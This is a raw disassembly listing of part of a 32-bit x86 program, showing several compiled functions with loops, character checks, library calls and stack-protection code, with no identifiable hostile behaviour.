  4032a9:	8b e8                	mov    %eax,%ebp
  4032ab:	3b 77 0c             	cmp    0xc(%edi),%esi
  4032ae:	0f 83 cb 00 00 00    	jae    0x40337f
  4032b4:	8a 4e 11             	mov    0x11(%esi),%cl
  4032b7:	80 f9 6d             	cmp    $0x6d,%cl
  4032ba:	74 09                	je     0x4032c5
  4032bc:	80 f9 4d             	cmp    $0x4d,%cl
  4032bf:	0f 85 a5 00 00 00    	jne    0x40336a
  4032c5:	56                   	push   %esi
  4032c6:	57                   	push   %edi
  4032c7:	e8 54 df ff ff       	call   0x401220
  4032cc:	83 c4 08             	add    $0x8,%esp
  4032cf:	8b d8                	mov    %eax,%ebx
  4032d1:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  4032d8:	ff 76 0c             	push   0xc(%esi)
  4032db:	74 14                	je     0x4032f1
  4032dd:	e8 7c 47 00 00       	call   0x407a5e
  4032e2:	83 e8 08             	sub    $0x8,%eax
  4032e5:	50                   	push   %eax
  4032e6:	8d 43 08             	lea    0x8(%ebx),%eax
  4032e9:	50                   	push   %eax
  4032ea:	68 d0 14 42 00       	push   $0x4214d0
  4032ef:	eb 29                	jmp    0x40331a
  4032f1:	83 3d 54 c9 42 00 25 	cmpl   $0x25,0x42c954
  4032f8:	7c 0e                	jl     0x403308
  4032fa:	e8 5f 47 00 00       	call   0x407a5e
  4032ff:	83 e8 10             	sub    $0x10,%eax
  403302:	50                   	push   %eax
  403303:	8d 43 10             	lea    0x10(%ebx),%eax
  403306:	eb 0c                	jmp    0x403314
  403308:	e8 51 47 00 00       	call   0x407a5e
  40330d:	83 e8 0c             	sub    $0xc,%eax
  403310:	50                   	push   %eax
  403311:	8d 43 0c             	lea    0xc(%ebx),%eax
  403314:	50                   	push   %eax
  403315:	68 d4 14 42 00       	push   $0x4214d4
  40331a:	55                   	push   %ebp
  40331b:	ff 15 c8 c9 42 00    	call   *0x42c9c8
  403321:	83 c4 10             	add    $0x10,%esp
  403324:	85 c0                	test   %eax,%eax
  403326:	74 12                	je     0x40333a
  403328:	50                   	push   %eax
  403329:	8d 46 12             	lea    0x12(%esi),%eax
  40332c:	50                   	push   %eax
  40332d:	ff 15 a4 c9 42 00    	call   *0x42c9a4
  403333:	83 c4 08             	add    $0x8,%esp
  403336:	85 c0                	test   %eax,%eax
  403338:	75 11                	jne    0x40334b
  40333a:	8d 46 12             	lea    0x12(%esi),%eax
  40333d:	50                   	push   %eax
  40333e:	68 d8 14 42 00       	push   $0x4214d8
  403343:	e8 c8 e6 ff ff       	call   0x401a10
  403348:	83 c4 08             	add    $0x8,%esp
  40334b:	ff 15 d8 c9 42 00    	call   *0x42c9d8
  403351:	85 c0                	test   %eax,%eax
  403353:	74 0c                	je     0x403361
  403355:	ff 15 dc c9 42 00    	call   *0x42c9dc
  40335b:	ff 15 d4 c9 42 00    	call   *0x42c9d4
  403361:	53                   	push   %ebx
  403362:	e8 ef 68 00 00       	call   0x409c56
  403367:	83 c4 04             	add    $0x4,%esp
  40336a:	56                   	push   %esi
  40336b:	57                   	push   %edi
  40336c:	e8 bf e1 ff ff       	call   0x401530
  403371:	8b f0                	mov    %eax,%esi
  403373:	83 c4 08             	add    $0x8,%esp
  403376:	3b 77 0c             	cmp    0xc(%edi),%esi
  403379:	0f 82 35 ff ff ff    	jb     0x4032b4
  40337f:	5d                   	pop    %ebp
  403380:	5f                   	pop    %edi
  403381:	5e                   	pop    %esi
  403382:	33 c0                	xor    %eax,%eax
  403384:	5b                   	pop    %ebx
  403385:	c3                   	ret
  403386:	cc                   	int3
  403387:	cc                   	int3
  403388:	cc                   	int3
  403389:	cc                   	int3
  40338a:	cc                   	int3
  40338b:	cc                   	int3
  40338c:	cc                   	int3
  40338d:	cc                   	int3
  40338e:	cc                   	int3
  40338f:	cc                   	int3
  403390:	53                   	push   %ebx
  403391:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  403395:	57                   	push   %edi
  403396:	8b 7b 08             	mov    0x8(%ebx),%edi
  403399:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  40339c:	0f 83 19 01 00 00    	jae    0x4034bb
  4033a2:	55                   	push   %ebp
  4033a3:	56                   	push   %esi
  4033a4:	80 7f 11 7a          	cmpb   $0x7a,0x11(%edi)
  4033a8:	0f 85 f6 00 00 00    	jne    0x4034a4
  4033ae:	ff 77 04             	push   0x4(%edi)
  4033b1:	e8 a8 46 00 00       	call   0x407a5e
  4033b6:	8b e8                	mov    %eax,%ebp
  4033b8:	03 6b 04             	add    0x4(%ebx),%ebp
  4033bb:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  4033c2:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4033c6:	74 79                	je     0x403441
  4033c8:	6a 00                	push   $0x0
  4033ca:	8d 6b 68             	lea    0x68(%ebx),%ebp
  4033cd:	55                   	push   %ebp
  4033ce:	6a 00                	push   $0x0
  4033d0:	e8 3b 19 00 00       	call   0x404d10
  4033d5:	8b f0                	mov    %eax,%esi
  4033d7:	83 c4 0c             	add    $0xc,%esp
  4033da:	85 f6                	test   %esi,%esi
  4033dc:	75 13                	jne    0x4033f1
  4033de:	55                   	push   %ebp
  4033df:	68 ec 14 42 00       	push   $0x4214ec
  4033e4:	e8 27 e6 ff ff       	call   0x401a10
  4033e9:	83 c4 08             	add    $0x8,%esp
  4033ec:	e9 b3 00 00 00       	jmp    0x4034a4
  4033f1:	ff 74 24 14          	push   0x14(%esp)
  4033f5:	56                   	push   %esi
  4033f6:	68 14 15 42 00       	push   $0x421514
  4033fb:	ff 15 f4 c9 42 00    	call   *0x42c9f4
  403401:	83 c4 0c             	add    $0xc,%esp
  403404:	89 44 24 14          	mov    %eax,0x14(%esp)
  403408:	3b f5                	cmp    %ebp,%esi
  40340a:	74 09                	je     0x403415
  40340c:	56                   	push   %esi
  40340d:	e8 44 68 00 00       	call   0x409c56
  403412:	83 c4 04             	add    $0x4,%esp
  403415:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  403419:	68 24 15 42 00       	push   $0x421524
  40341e:	ff 15 f0 c9 42 00    	call   *0x42c9f0
  403424:	83 c4 04             	add    $0x4,%esp
  403427:	85 c0                	test   %eax,%eax
  403429:	75 5d                	jne    0x403488
  40342b:	68 2c 15 42 00       	push   $0x42152c
  403430:	e8 db e5 ff ff       	call   0x401a10
  403435:	55                   	push   %ebp
  403436:	ff 15 84 c9 42 00    	call   *0x42c984
  40343c:	83 c4 08             	add    $0x8,%esp
  40343f:	eb 63                	jmp    0x4034a4
  403441:	8d 53 68             	lea    0x68(%ebx),%edx
  403444:	8b c2                	mov    %edx,%eax
  403446:	8d 70 01             	lea    0x1(%eax),%esi
  403449:	0f 1f 80 00 00 00 00 	nopl   0x0(%eax)
  403450:	8a 08                	mov    (%eax),%cl
  403452:	40                   	inc    %eax
  403453:	84 c9                	test   %cl,%cl
  403455:	75 f9                	jne    0x403450
  403457:	68 7c 14 42 00       	push   $0x42147c
  40345c:	2b c6                	sub    %esi,%eax
  40345e:	68 84 14 42 00       	push   $0x421484
  403463:	50                   	push   %eax
  403464:	52                   	push   %edx
  403465:	ff 15 00 ca 42 00    	call   *0x42ca00
  40346b:	8b f0                	mov    %eax,%esi
  40346d:	55                   	push   %ebp
  40346e:	56                   	push   %esi
  40346f:	68 1c 15 42 00       	push   $0x42151c
  403474:	ff 15 f8 c9 42 00    	call   *0x42c9f8
  40347a:	56                   	push   %esi
  40347b:	8b e8                	mov    %eax,%ebp
  40347d:	ff 15 84 c9 42 00    	call   *0x42c984
  403483:	83 c4 20             	add    $0x20,%esp
  403486:	eb 91                	jmp    0x403419
  403488:	55                   	push   %ebp
  403489:	50                   	push   %eax
  40348a:	ff 15 b8 c9 42 00    	call   *0x42c9b8
  403490:	83 c4 08             	add    $0x8,%esp
  403493:	85 c0                	test   %eax,%eax
  403495:	74 0d                	je     0x4034a4
  403497:	68 54 15 42 00       	push   $0x421554
  40349c:	e8 6f e5 ff ff       	call   0x401a10
  4034a1:	83 c4 04             	add    $0x4,%esp
  4034a4:	57                   	push   %edi
  4034a5:	53                   	push   %ebx
  4034a6:	e8 85 e0 ff ff       	call   0x401530
  4034ab:	8b f8                	mov    %eax,%edi
  4034ad:	83 c4 08             	add    $0x8,%esp
  4034b0:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  4034b3:	0f 82 eb fe ff ff    	jb     0x4033a4
  4034b9:	5e                   	pop    %esi
  4034ba:	5d                   	pop    %ebp
  4034bb:	5f                   	pop    %edi
  4034bc:	33 c0                	xor    %eax,%eax
  4034be:	5b                   	pop    %ebx
  4034bf:	c3                   	ret
  4034c0:	b8 44 20 00 00       	mov    $0x2044,%eax
  4034c5:	e8 b6 45 00 00       	call   0x407a80
  4034ca:	a1 08 c0 42 00       	mov    0x42c008,%eax
  4034cf:	33 c4                	xor    %esp,%eax
  4034d1:	89 84 24 40 20 00 00 	mov    %eax,0x2040(%esp)
  4034d8:	b8 67 66 66 66       	mov    $0x66666667,%eax
  4034dd:	f7 2d 54 c9 42 00    	imull  0x42c954
  4034e3:	33 c0                	xor    %eax,%eax
  4034e5:	c1 fa 02             	sar    $0x2,%edx
  4034e8:	8b ca                	mov    %edx,%ecx
  4034ea:	c1 e9 1f             	shr    $0x1f,%ecx
  4034ed:	56                   	push   %esi
  4034ee:	8b b4 24 4c 20 00 00 	mov    0x204c(%esp),%esi
  4034f5:	03 ca                	add    %edx,%ecx
  4034f7:	83 f9 02             	cmp    $0x2,%ecx
  4034fa:	6a 40                	push   $0x40
  4034fc:	0f 94 c0             	sete   %al
  4034ff:	a3 64 a6 43 00       	mov    %eax,0x43a664
  403504:	8d 46 28             	lea    0x28(%esi),%eax
  403507:	50                   	push   %eax
  403508:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40350c:	50                   	push   %eax
  40350d:	e8 ae 99 00 00       	call   0x40cec0
  403512:	83 c4 0c             	add    $0xc,%esp
  403515:	80 7c 24 43 00       	cmpb   $0x0,0x43(%esp)
  40351a:	0f 85 ab 00 00 00    	jne    0x4035cb
  403520:	83 be 68 40 00 00 00 	cmpl   $0x0,0x4068(%esi)
  403527:	74 34                	je     0x40355d
  403529:	68 50 12 42 00       	push   $0x421250
  40352e:	8d 86 68 20 00 00    	lea    0x2068(%esi),%eax
  403534:	50                   	push   %eax
  403535:	8d 44 24 4c          	lea    0x4c(%esp),%eax
  403539:	50                   	push   %eax
  40353a:	e8 11 f5 ff ff       	call   0x402a50
  40353f:	8d 44 24 50          	lea    0x50(%esp),%eax
  403543:	50                   	push   %eax
  403544:	e8 b7 f3 ff ff       	call   0x402900
  403549:	83 c4 10             	add    $0x10,%esp
  40354c:	85 c0                	test   %eax,%eax
  40354e:	74 0d                	je     0x40355d
  403550:	8d 44 24 44          	lea    0x44(%esp),%eax
  403554:	50                   	push   %eax
  403555:	e8 86 10 00 00       	call   0x4045e0
  40355a:	83 c4 04             	add    $0x4,%esp
  40355d:	8d 44 24 04          	lea    0x4(%esp),%eax
  403561:	50                   	push   %eax
  403562:	8d 86 68 30 00 00    	lea    0x3068(%esi),%eax
  403568:	50                   	push   %eax
  403569:	8d 84 24 4c 10 00 00 	lea    0x104c(%esp),%eax
  403570:	50                   	push   %eax
  403571:	e8 da f4 ff ff       	call   0x402a50
  403576:	8d 84 24 50 10 00 00 	lea    0x1050(%esp),%eax
  40357d:	50                   	push   %eax
  40357e:	e8 5d 10 00 00       	call   0x4045e0
  403583:	83 c4 10             	add    $0x10,%esp
  403586:	85 c0                	test   %eax,%eax
  403588:	75 1c                	jne    0x4035a6
  40358a:	8d 84 24 44 10 00 00 	lea    0x1044(%esp),%eax
  403591:	50                   	push   %eax
  403592:	68 60 12 42 00       	push   $0x421260
  403597:	68 80 12 42 00       	push   $0x421280
  40359c:	e8 5f e3 ff ff       	call   0x401900
  4035a1:	83 c4 0c             	add    $0xc,%esp
  4035a4:	eb 32                	jmp    0x4035d8
  4035a6:	ff 35 54 c9 42 00    	push   0x42c954
  4035ac:	50                   	push   %eax
  4035ad:	e8 be f5 ff ff       	call   0x402b70
  4035b2:	83 c4 08             	add    $0x8,%esp
  4035b5:	5e                   	pop    %esi
  4035b6:	8b 8c 24 40 20 00 00 	mov    0x2040(%esp),%ecx
  4035bd:	33 cc                	xor    %esp,%ecx
  4035bf:	e8 a0 44 00 00       	call   0x407a64
  4035c4:	81 c4 44 20 00 00    	add    $0x2044,%esp
  4035ca:	c3                   	ret
  4035cb:	68 30 12 42 00       	push   $0x421230
  4035d0:	e8 3b e4 ff ff       	call   0x401a10
  4035d5:	83 c4 04             	add    $0x4,%esp
  4035d8:	8b 8c 24 44 20 00 00 	mov    0x2044(%esp),%ecx
  4035df:	83 c8 ff             	or     $0xffffffff,%eax
  4035e2:	5e                   	pop    %esi
  4035e3:	33 cc                	xor    %esp,%ecx
  4035e5:	e8 7a 44 00 00       	call   0x407a64
  4035ea:	81 c4 44 20 00 00    	add    $0x2044,%esp
  4035f0:	c3                   	ret
  4035f1:	cc                   	int3
  4035f2:	cc                   	int3
  4035f3:	cc                   	int3
  4035f4:	cc                   	int3
  4035f5:	cc                   	int3
  4035f6:	cc                   	int3
  4035f7:	cc                   	int3
  4035f8:	cc                   	int3
  4035f9:	cc                   	int3
  4035fa:	cc                   	int3
  4035fb:	cc                   	int3
  4035fc:	cc                   	int3
  4035fd:	cc                   	int3
  4035fe:	cc                   	int3
  4035ff:	cc                   	int3
  403600:	b8 08 20 00 00       	mov    $0x2008,%eax
  403605:	e8 76 44 00 00       	call   0x407a80
  40360a:	a1 08 c0 42 00       	mov    0x42c008,%eax
  40360f:	33 c4                	xor    %esp,%eax
  403611:	89 84 24 04 20 00 00 	mov    %eax,0x2004(%esp)
  403618:	a1 5c c9 42 00       	mov    0x42c95c,%eax
  40361d:	53                   	push   %ebx
  40361e:	8b 9c 24 10 20 00 00 	mov    0x2010(%esp),%ebx
  403625:	55                   	push   %ebp
  403626:	56                   	push   %esi
  403627:	33 ed                	xor    %ebp,%ebp
  403629:	8b 73 08             	mov    0x8(%ebx),%esi
  40362c:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403632:	a1 58 c9 42 00       	mov    0x42c958,%eax
  403637:	57                   	push   %edi
  403638:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  40363e:	a1 70 c9 42 00       	mov    0x42c970,%eax
  403643:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403649:	a1 74 c9 42 00       	mov    0x42c974,%eax
  40364e:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403654:	a1 6c c9 42 00       	mov    0x42c96c,%eax
  403659:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  40365f:	a1 68 c9 42 00       	mov    0x42c968,%eax
  403664:	89 28                	mov    %ebp,(%eax)
  403666:	3b 73 0c             	cmp    0xc(%ebx),%esi
  403669:	0f 83 49 01 00 00    	jae    0x4037b8
  40366f:	90                   	nop
  403670:	80 7e 11 6f          	cmpb   $0x6f,0x11(%esi)
  403674:	0f 85 8c 00 00 00    	jne    0x403706
  40367a:	6a 04                	push   $0x4
  40367c:	8d 7e 12             	lea    0x12(%esi),%edi
  40367f:	68 8c 12 42 00       	push   $0x42128c
  403684:	57                   	push   %edi
  403685:	e8 76 62 00 00       	call   0x409900
  40368a:	83 c4 0c             	add    $0xc,%esp
  40368d:	85 c0                	test   %eax,%eax
  40368f:	74 75                	je     0x403706
  403691:	0f be 07             	movsbl (%edi),%eax
  403694:	83 c0 b1             	add    $0xffffffb1,%eax
  403697:	83 f8 27             	cmp    $0x27,%eax
  40369a:	77 6a                	ja     0x403706
  40369c:	0f b6 80 00 38 40 00 	movzbl 0x403800(%eax),%eax
  4036a3:	ff 24 85 ec 37 40 00 	jmp    *0x4037ec(,%eax,4)
  4036aa:	a1 68 c9 42 00       	mov    0x42c968,%eax
  4036af:	eb 4f                	jmp    0x403700
  4036b1:	bd 01 00 00 00       	mov    $0x1,%ebp
  4036b6:	eb 4e                	jmp    0x403706
  4036b8:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  4036bf:	8d 46 14             	lea    0x14(%esi),%eax
  4036c2:	74 0b                	je     0x4036cf
  4036c4:	50                   	push   %eax
  4036c5:	e8 76 fa ff ff       	call   0x403140
  4036ca:	83 c4 04             	add    $0x4,%esp
  4036cd:	eb 37                	jmp    0x403706
  4036cf:	68 00 10 00 00       	push   $0x1000
  4036d4:	50                   	push   %eax
  4036d5:	8d 44 24 18          	lea    0x18(%esp),%eax
  4036d9:	50                   	push   %eax
  4036da:	e8 f4 a7 00 00       	call   0x40ded3
  4036df:	83 c4 0c             	add    $0xc,%esp
  4036e2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4036e5:	0f 84 e8 00 00 00    	je     0x4037d3
  4036eb:	8d 44 24 10          	lea    0x10(%esp),%eax
  4036ef:	50                   	push   %eax
  4036f0:	ff 15 e0 c9 42 00    	call   *0x42c9e0
  4036f6:	83 c4 04             	add    $0x4,%esp
  4036f9:	eb 0b                	jmp    0x403706
  4036fb:	a1 60 c9 42 00       	mov    0x42c960,%eax
  403700:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  403706:	56                   	push   %esi
  403707:	53                   	push   %ebx
  403708:	e8 23 de ff ff       	call   0x401530
  40370d:	8b f0                	mov    %eax,%esi
  40370f:	83 c4 08             	add    $0x8,%esp
  403712:	3b 73 0c             	cmp    0xc(%ebx),%esi
  403715:	0f 82 55 ff ff ff    	jb     0x403670
  40371b:	85 ed                	test   %ebp,%ebp
  40371d:	0f 84 95 00 00 00    	je     0x4037b8
  403723:	68 00 80 00 00       	push   $0x8000
  403728:	6a 00                	push   $0x0
  40372a:	e8 0f 75 00 00       	call   0x40ac3e
  40372f:	50                   	push   %eax
  403730:	e8 f7 ab 00 00       	call   0x40e32c
  403735:	83 c4 08             	add    $0x8,%esp
  403738:	50                   	push   %eax
  403739:	e8 28 a8 00 00       	call   0x40df66
  40373e:	83 c4 08             	add    $0x8,%esp
  403741:	68 00 80 00 00       	push   $0x8000
  403746:	6a 01                	push   $0x1
  403748:	e8 f1 74 00 00       	call   0x40ac3e
  40374d:	50                   	push   %eax
  40374e:	e8 d9 ab 00 00       	call   0x40e32c
  403753:	83 c4 08             	add    $0x8,%esp
  403756:	50                   	push   %eax
  403757:	e8 0a a8 00 00       	call   0x40df66
  40375c:	6a 01                	push   $0x1
  40375e:	e8 db 74 00 00       	call   0x40ac3e
  403763:	50                   	push   %eax
  403764:	e8 6a ab 00 00       	call   0x40e2d3
  403769:	6a 02                	push   $0x2
  40376b:	e8 ce 74 00 00       	call   0x40ac3e
  403770:	50                   	push   %eax
  403771:	e8 5d ab 00 00       	call   0x40e2d3
  403776:	83 c4 18             	add    $0x18,%esp
  403779:	6a 00                	push   $0x0
  40377b:	6a 00                	push   $0x0
  40377d:	e8 bc 74 00 00       	call   0x40ac3e
  403782:	83 c4 04             	add    $0x4,%esp
  403785:	50                   	push   %eax
  403786:	e8 de a0 00 00       	call   0x40d869
  40378b:	83 c4 08             	add    $0x8,%esp
  40378e:	6a 00                	push   $0x0
  403790:	6a 01                	push   $0x1
  403792:	e8 a7 74 00 00       	call   0x40ac3e
  403797:	83 c4 04             	add    $0x4,%esp
  40379a:	50                   	push   %eax
  40379b:	e8 c9 a0 00 00       	call   0x40d869
  4037a0:	83 c4 08             	add    $0x8,%esp
  4037a3:	6a 00                	push   $0x0
  4037a5:	6a 02                	push   $0x2
  4037a7:	e8 92 74 00 00       	call   0x40ac3e
  4037ac:	83 c4 04             	add    $0x4,%esp
  4037af:	50                   	push   %eax
  4037b0:	e8 b4 a0 00 00       	call   0x40d869
  4037b5:	83 c4 08             	add    $0x8,%esp
  4037b8:	33 c0                	xor    %eax,%eax
  4037ba:	8b 8c 24 14 20 00 00 	mov    0x2014(%esp),%ecx
  4037c1:	5f                   	pop    %edi
  4037c2:	5e                   	pop    %esi
  4037c3:	5d                   	pop    %ebp
  4037c4:	5b                   	pop    %ebx
  4037c5:	33 cc                	xor    %esp,%ecx
  4037c7:	e8 98 42 00 00       	call   0x407a64
  4037cc:	81 c4 08 20 00 00    	add    $0x2008,%esp
  4037d2:	c3                   	ret
  4037d3:	8d 46 14             	lea    0x14(%esi),%eax
  4037d6:	50                   	push   %eax
  4037d7:	68 98 12 42 00       	push   $0x421298
  4037dc:	e8 2f e2 ff ff       	call   0x401a10
  4037e1:	83 c4 08             	add    $0x8,%esp
  4037e4:	83 c8 ff             	or     $0xffffffff,%eax
  4037e7:	eb d1                	jmp    0x4037ba
  4037e9:	0f 1f 00             	nopl   (%eax)
  4037ec:	fb                   	sti
  4037ed:	36 40                	ss inc %eax
  4037ef:	00 b8 36 40 00 b1    	add    %bh,-0x4effbfca(%eax)
  4037f5:	36 40                	ss inc %eax
  4037f7:	00 aa 36 40 00 06    	add    %ch,0x6004036(%edx)
  4037fd:	37                   	aaa
  4037fe:	40                   	inc    %eax
  4037ff:	00 00                	add    %al,(%eax)
  403801:	04 04                	add    $0x4,%al
  403803:	04 04                	add    $0x4,%al
  403805:	04 04                	add    $0x4,%al
  403807:	04 01                	add    $0x1,%al
  403809:	04 04                	add    $0x4,%al
  40380b:	04 04                	add    $0x4,%al
  40380d:	04 04                	add    $0x4,%al
  40380f:	04 04                	add    $0x4,%al
  403811:	04 04                	add    $0x4,%al
  403813:	04 04                	add    $0x4,%al
  403815:	04 04                	add    $0x4,%al
  403817:	04 04                	add    $0x4,%al
  403819:	04 04                	add    $0x4,%al
  40381b:	04 04                	add    $0x4,%al
  40381d:	04 04                	add    $0x4,%al
  40381f:	04 04                	add    $0x4,%al
  403821:	04 04                	add    $0x4,%al
  403823:	04 04                	add    $0x4,%al
  403825:	04 02                	add    $0x2,%al
  403827:	03 cc                	add    %esp,%ecx
  403829:	cc                   	int3
  40382a:	cc                   	int3
  40382b:	cc                   	int3
  40382c:	cc                   	int3
  40382d:	cc                   	int3
  40382e:	cc                   	int3
  40382f:	cc                   	int3
  403830:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  403837:	56                   	push   %esi
  403838:	57                   	push   %edi
  403839:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  40383d:	ff b7 74 40 00 00    	push   0x4074(%edi)
  403843:	ff b7 70 40 00 00    	push   0x4070(%edi)
  403849:	74 3d                	je     0x403888
  40384b:	e8 10 11 00 00       	call   0x404960
  403850:	8b f0                	mov    %eax,%esi
  403852:	83 c4 08             	add    $0x8,%esp
  403855:	85 f6                	test   %esi,%esi
  403857:	74 1c                	je     0x403875
  403859:	6a 00                	push   $0x0
  40385b:	56                   	push   %esi
  40385c:	ff b7 70 40 00 00    	push   0x4070(%edi)
  403862:	e8 e9 f8 ff ff       	call   0x403150
  403867:	56                   	push   %esi
  403868:	e8 e9 63 00 00       	call   0x409c56
  40386d:	83 c4 10             	add    $0x10,%esp
  403870:	33 c0                	xor    %eax,%eax
  403872:	5f                   	pop    %edi
  403873:	5e                   	pop    %esi
  403874:	c3                   	ret
  403875:	68 e0 12 42 00       	push   $0x4212e0
  40387a:	e8 91 e1 ff ff       	call   0x401a10
  40387f:	83 c4 04             	add    $0x4,%esp
  403882:	83 c8 ff             	or     $0xffffffff,%eax
  403885:	5f                   	pop    %edi
  403886:	5e                   	pop    %esi
  403887:	c3                   	ret
  403888:	e8 c3 15 00 00       	call   0x404e50
  40388d:	8b f0                	mov    %eax,%esi
  40388f:	83 c4 08             	add    $0x8,%esp
  403892:	85 f6                	test   %esi,%esi
  403894:	74 1d                	je     0x4038b3
  403896:	6a 00                	push   $0x0
  403898:	56                   	push   %esi
  403899:	ff b7 70 40 00 00    	push   0x4070(%edi)
  40389f:	ff 15 9c c9 42 00    	call   *0x42c99c
  4038a5:	56                   	push   %esi
  4038a6:	e8 e5 f8 ff ff       	call   0x403190
  4038ab:	83 c4 10             	add    $0x10,%esp
  4038ae:	33 c0                	xor    %eax,%eax
  4038b0:	5f                   	pop    %edi
  4038b1:	5e                   	pop    %esi
  4038b2:	c3                   	ret
  4038b3:	68 00 13 42 00       	push   $0x421300
  4038b8:	e8 53 e1 ff ff       	call   0x401a10
  4038bd:	83 c4 04             	add    $0x4,%esp
  4038c0:	83 c8 ff             	or     $0xffffffff,%eax
  4038c3:	5f                   	pop    %edi
  4038c4:	5e                   	pop    %esi
  4038c5:	c3                   	ret
  4038c6:	cc                   	int3
  4038c7:	cc                   	int3
  4038c8:	cc                   	int3
  4038c9:	cc                   	int3
  4038ca:	cc                   	int3
  4038cb:	cc                   	int3
  4038cc:	cc                   	int3
  4038cd:	cc                   	int3
  4038ce:	cc                   	int3
  4038cf:	cc                   	int3
  4038d0:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  4038d7:	56                   	push   %esi
  4038d8:	8b 74 24 08          	mov    0x8(%esp),%esi
  4038dc:	68 00 10 00 00       	push   $0x1000
  4038e1:	8d 46 68             	lea    0x68(%esi),%eax
  4038e4:	50                   	push   %eax
  4038e5:	74 2f                	je     0x403916
  4038e7:	68 38 1a 43 00       	push   $0x431a38
  4038ec:	e8 1f 14 00 00       	call   0x404d10
  4038f1:	83 c4 0c             	add    $0xc,%esp
  4038f4:	85 c0                	test   %eax,%eax
  4038f6:	75 12                	jne    0x40390a
  4038f8:	68 24 13 42 00       	push   $0x421324
  4038fd:	e8 0e e1 ff ff       	call   0x401a10
  403902:	83 c4 04             	add    $0x4,%esp
  403905:	83 c8 ff             	or     $0xffffffff,%eax
  403908:	5e                   	pop    %esi
  403909:	c3                   	ret
  40390a:	68 38 1a 43 00       	push   $0x431a38
  40390f:	e8 5c f8 ff ff       	call   0x403170
  403914:	eb 1c                	jmp    0x403932
  403916:	68 50 6a 43 00       	push   $0x436a50
  40391b:	e8 10 14 00 00       	call   0x404d30
  403920:	83 c4 0c             	add    $0xc,%esp
  403923:	85 c0                	test   %eax,%eax
  403925:	74 d1                	je     0x4038f8
  403927:	68 50 6a 43 00       	push   $0x436a50
  40392c:	ff 15 88 c9 42 00    	call   *0x42c988
  403932:	83 c4 04             	add    $0x4,%esp
  403935:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  40393c:	57                   	push   %edi
  40393d:	8d be 68 30 00 00    	lea    0x3068(%esi),%edi
  403943:	68 00 10 00 00       	push   $0x1000
  403948:	57                   	push   %edi
  403949:	74 30                	je     0x40397b
  40394b:	68 30 0a 43 00       	push   $0x430a30
  403950:	e8 bb 13 00 00       	call   0x404d10
  403955:	83 c4 0c             	add    $0xc,%esp
  403958:	85 c0                	test   %eax,%eax
  40395a:	75 13                	jne    0x40396f
  40395c:	68 4c 13 42 00       	push   $0x42134c
  403961:	e8 aa e0 ff ff       	call   0x401a10
  403966:	83 c4 04             	add    $0x4,%esp
  403969:	83 c8 ff             	or     $0xffffffff,%eax
  40396c:	5f                   	pop    %edi
  40396d:	5e                   	pop    %esi
  40396e:	c3                   	ret
  40396f:	68 30 0a 43 00       	push   $0x430a30
  403974:	e8 07 f8 ff ff       	call   0x403180
  403979:	eb 2f                	jmp    0x4039aa
  40397b:	68 48 4a 43 00       	push   $0x434a48
  403980:	e8 ab 13 00 00       	call   0x404d30
  403985:	83 c4 0c             	add    $0xc,%esp
  403988:	85 c0                	test   %eax,%eax
  40398a:	75 13                	jne    0x40399f
  40398c:	68 8c 13 42 00       	push   $0x42138c
  403991:	e8 7a e0 ff ff       	call   0x401a10
  403996:	83 c4 04             	add    $0x4,%esp
  403999:	83 c8 ff             	or     $0xffffffff,%eax
  40399c:	5f                   	pop    %edi
  40399d:	5e                   	pop    %esi
  40399e:	c3                   	ret
  40399f:	68 48 4a 43 00       	push   $0x434a48
  4039a4:	ff 15 8c c9 42 00    	call   *0x42c98c
  4039aa:	8b cf                	mov    %edi,%ecx
  4039ac:	83 c4 04             	add    $0x4,%esp
  4039af:	83 3d 64 a6 43 00 00 	cmpl   $0x0,0x43a664
  4039b6:	8d 51 01             	lea    0x1(%ecx),%edx
  4039b9:	74 1c                	je     0x4039d7
  4039bb:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  4039c0:	8a 01                	mov    (%ecx),%al
  4039c2:	41                   	inc    %ecx
  4039c3:	84 c0                	test   %al,%al
  4039c5:	75 f9                	jne    0x4039c0
  4039c7:	2b ca                	sub    %edx,%ecx
  4039c9:	51                   	push   %ecx
  4039ca:	57                   	push   %edi
  4039cb:	68 10 ca 42 00       	push   $0x42ca10
  4039d0:	e8 eb 94 00 00       	call   0x40cec0
  4039d5:	eb 65                	jmp    0x403a3c
  4039d7:	8a 01                	mov    (%ecx),%al
  4039d9:	41                   	inc    %ecx
  4039da:	84 c0                	test   %al,%al
  4039dc:	75 f9                	jne    0x4039d7
  4039de:	2b ca                	sub    %edx,%ecx
  4039e0:	51                   	push   %ecx
  4039e1:	57                   	push   %edi
  4039e2:	68 10 ca 42 00       	push   $0x42ca10
  4039e7:	e8 d4 94 00 00       	call   0x40cec0
  4039ec:	6a 01                	push   $0x1
  4039ee:	68 3c 04 42 00       	push   $0x42043c
  4039f3:	68 10 ca 42 00       	push   $0x42ca10
  4039f8:	e8 a3 9e 00 00       	call   0x40d8a0
  4039fd:	6a 10                	push   $0x10
  4039ff:	68 b4 13 42 00       	push   $0x4213b4
  403a04:	68 10 ca 42 00       	push   $0x42ca10
  403a09:	e8 92 9e 00 00       	call   0x40d8a0
  403a0e:	6a 01                	push   $0x1
  403a10:	68 c8 13 42 00       	push   $0x4213c8
  403a15:	68 10 ca 42 00       	push   $0x42ca10
  403a1a:	e8 81 9e 00 00       	call   0x40d8a0
  403a1f:	8b cf                	mov    %edi,%ecx
  403a21:	83 c4 30             	add    $0x30,%esp
